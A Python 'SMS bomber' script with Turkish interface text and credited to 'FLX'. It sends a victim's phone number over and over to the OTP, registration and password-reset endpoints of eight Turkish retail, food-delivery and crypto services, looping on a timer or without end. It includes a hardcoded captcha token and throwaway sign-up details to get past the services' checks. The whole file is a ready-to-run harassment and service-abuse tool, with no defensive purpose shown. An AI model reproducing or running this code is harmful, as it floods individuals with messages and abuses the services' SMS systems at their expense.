import json
import sys
import requests
import time
from bs4 import BeautifulSoup
from colorama import init, Fore
import uuid

init(autoreset=True)




sms = ["████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ████████████             ████████████  ████████████████████████████",
       "████████████████████████████  █████████████           █████████████  ████████████████████████████",
       "████████████████████████████  ███████████████       ███████████████  ████████████████████████████",
       "██████████                    ████████████████     ████████████████  ██████████",
       "██████████                    ███████   ███████   ███████   ███████  ██████████",
       "██████████                    ███████    ███████ ███████    ███████  ██████████",
       "██████████                    ███████      ███████████      ███████  ██████████",
       "████████████████████████████  ███████        ███████        ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       ]




flx = [
    "███████████████████████████████      ███████████                        ███████████        ███████████",
    "██████████████████████████████       ███████████                        ███████████        ███████████",
    "█████████████████████████████        ███████████                         ███████████      ███████████",
    "████████████████████████████         ███████████                          ███████████    ███████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ███████████                             █████████████████████",
    "███████████                          ███████████                              ███████████████████",
    "███████████                          ███████████                               █████████████████",
    "███████████                          ███████████                                 █████████████",
    "█████████████████████                ███████████                                   █████████",
    "████████████████████                 ███████████                                 ████████████",
    "███████████████████                  ███████████                               ████████████████",
    "██████████████████                   ███████████                              ██████████████████",
    "███████████                          ███████████                             ████████████████████",
    "███████████                          ███████████                            ██████████████████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ████████████████████████████         ███████████    ███████████",
    "███████████                          ████████████████████████████        ███████████      ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
]

def sok (numara):
    url = "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate"
    payload = {
        "captchaAction" : "generate_register_otp",
        "captchaToken" : "",
        "clientId" : "buyer-web",
        "phoneNumber" : numara,
        "reCaptchaV2" :False
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN +"[+] Şok Başarılı!")
    else:
        print(Fore.RED + "[-] Şok Başarısız!")

def kahvedunyasi(numara):
    url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
    paykoad = {
        "countryCode" : "90",
        "phoneNumber" : numara,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=paykoad, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN+ "[+] KahveDünyası Başarılı!")
    else:
        print(Fore.RED+ "[+] KahveDünyası Başarısız!")

def dominosgiris(numara):
    url = "https://frontend.dominos.com.tr/api/authentication/sendLoginOtpCode"
    payload = {
        "captchaToken" : "03AFcWeA4uOFC5Bvy2gGdsKR-iADZjBWZ7ac4o31US1ZEa2BHFt0FEvEPV0hhNwGjG98uheeORhHISBHX4lnHG04iigH_X7hoPbdMnCAmp2BE4GXzKGZH28x3a75JlFhcK_QfXGistOKYIZkvirTtQDn8C2Jjp00nOLm-uOgZepYU0_gHcUQcQAseGuaJwqDCffT4hAIu2Qz6yTmp9HcqI6DV76yZdqAjL9qJS_Pj54aNCBzvNxPNu7oITVusj4FlIZzn3-5F1bBrXn6d1IAO8k0OHUiIic28oFtupijEGa0WagcppHmx7NiUXPIWv_nnIYII5aFB9_sgWA_UZkdN4W_OfDcq2aM4UPanCe5KIlcz6PpKDFWjquacoEu8XFA--4WYiQVELdQYYjU13MD59bSx4MQI5gn-P2mkAF_t8nvNraLWKv9CriJY9nDdDmzhGO3u_7Tprce934lDWCEItyX7h4yInKOrfWMRzC1QqLO5NuSXAQcCeWMfPUn2CHOIDhow_KgsQjHvqWzTMMT00A70m4IQ1v9_SZtguiHFbbE097umfJQN5ZskRNKr9zWrCcCdwDQMZqI-jzJ95xRuzcZoPm47z8hzn_rrAfTLvt2pzdRgE4Z3z1LMkeaD9Vr000uU9wRVEumeDzrLuAzo-2sOHwF5GCQPdPzYGI070DtL2da92esomlxG1u66gIDDbTg4mypWvBhTQVglNl0IapgXg1SQa8bx3fPwLlgL9xk051uvFxjREdI2usnS95vWhVlprb4b1orgnfvfV18Ticsbv4eV8L2PM9Q4q6oy_vVBS4XNNroYpwM9gqIn6zuTm_q1UZLYCMiWaTt17o80Y2kCqtg2nBNS7DwJB5XVqxp_qHcdeciM9EFawZP698J1KvcYzLt7wRvUK_JD3AWsQiYR9K0L0QtWNhwSE0hHjQmzT_QQ3y4uZkXQ",
        "channelCode": "WEB",
        "email" : "",
        "isRegisterV2" : False,
        "isSure" : False,
        "mobilePhone" : numara
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN+ "[+] Dominos Başarılı!")
    else:
        print(Fore.RED+ "[-] Dominos Başarısız!")


def kimgbister(numara):
    url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/pin/send-otp"
    payload = {
        "msisdn" : numara,
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] kimgbister Başarılı!")
    else:
        print(Fore.RED + "[-] kimgbister Başarısız!")

def  bitlo(numara):
    url = "https://api.bitlo.com/auth/forgot-password"
    payload = {
        "identifier": "+90" + numara,
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response5 = requests.post(url, json=payload, headers=headers)
    if response5.status_code == 200:
        print(Fore.GREEN + "[+] Bitlo Başarılı")
    else:
        print(Fore.RED + "[-] Bitlo Başarısız!")

def koton(numara):

    url = "https://www.koton.com/users/register/"  # Buraya doğru endpoint gelecek

    payload = {
        "call_allowed": False,
        "confirm": True,
        "date_of_birth": "2001-01-01",
        "email": "sms@yopmail.com",
        "email_allowed": False,
        "first_name": "fawewaeq",
        "gender": "male",
        "kvkk_confirm": True,
        "last_name": "syopmailcom",
        "password": "aELZrsELfXGyuC9",
        "phone": numara,
        "sms_allowed": False
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.koton.com/users/register/",
        "Referer": "https://www.koton.com/users/register/"
    }


    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200 or 202:
        print(Fore.GREEN+ "[+] Koton Başarılı!")
    else:
        print(Fore.RED+ "[-] Koton Başarısız!")

def tıklagelsin(numara):
    url = "https://www.tiklagelsin.com/user/graphql"

    # Benzersiz challenge ve device ID üret
    challenge = str(uuid.uuid4())
    device_id = "web_" + str(uuid.uuid4())

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://www.tiklagelsin.com",
        "Referer": "https://www.tiklagelsin.com/giris"
    }

    payload = {
        "operationName": "GENERATE_OTP",
        "query": """
            mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
                generateOtp(
                    phone: $phone
                    challenge: $challenge
                    deviceUniqueId: $deviceUniqueId
                )
            }
        """,
        "variables": {
            "phone": "90" + numara,
            "challenge": challenge,
            "deviceUniqueId": device_id
        }
    }

    response = requests.post(url, headers=headers, json=payload)

    if response.status_code == 200:
        result = response.json()
        if result.get("data", {}).get("generateOtp") is not None:
            print(Fore.GREEN+"[+] TiklaGelsin Başarılı!")
        else:
            print(Fore.RED+"[-] TıklaGelsin Başarısız!")

def englishhome(numara):
    url = "https://www.englishhome.com/api/member/sendOtp"
    payload = {
        "Phone": numara,
        "XID": ""
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        result = response.json()
        if result.get("isError") == False:
            print(Fore.GREEN + "[+] Englishhome Başarılı!")
        else:
            print(Fore.RED + "[-] Englishhome Başarısız!")
    else:
        print(Fore.RED + "[-] Englishhome Başarısız!")


main = [sok, kahvedunyasi, dominosgiris, kimgbister, bitlo, koton, tıklagelsin, englishhome]

for line in flx:
    print(Fore.RED + line)

print("Developer By : FLX                    Sms Bomber")

print(Fore.YELLOW +"1-Normal Sms")
print(Fore.YELLOW +"2-Turbo Sms")
print(Fore.YELLOW +"3-Çıkış")
seçim = input(Fore.BLUE+ "\nSeçim : ")

if seçim == "1":
    numara = input(Fore.RED + "\n"*500+"Numara: ")

    print("\n" * 500)

    aralık = input(Fore.YELLOW + "Kaç saniye arayla göndermek istersin?: ")
    if aralık.strip() == "":
        aralık = "1"
    aralık = int(aralık)

    print("\n" * 500)

    adet_input = input(Fore.YELLOW + "Kaç adet sms gönderilsi(Enter = sonsuz): ")

    print("\n" * 500)

    if adet_input.strip() == "":
        i = 0
        while True:
            fonksiyon = main[i % len(main)]
            fonksiyon(numara)
            time.sleep(aralık)
            i += 1
    else:
        try:
            adet = int(adet_input)
        except ValueError:
            adet = len(main)

        for i in range(adet):
            fonksiyon = main[i % len(main)]
            fonksiyon(numara)
            time.sleep(aralık)






if seçim == "2":
    print("\n" * 500)
    numara = input(Fore.RED + "Numara: ")
    print("\n" * 500)
    i = 0
    while True:
        func = main[i % len(main)]
        func(numara)
        i += 1
if seçim != "1" or "2" or "3":
    sys.exit()
if seçim =="3":
    sys.exit()
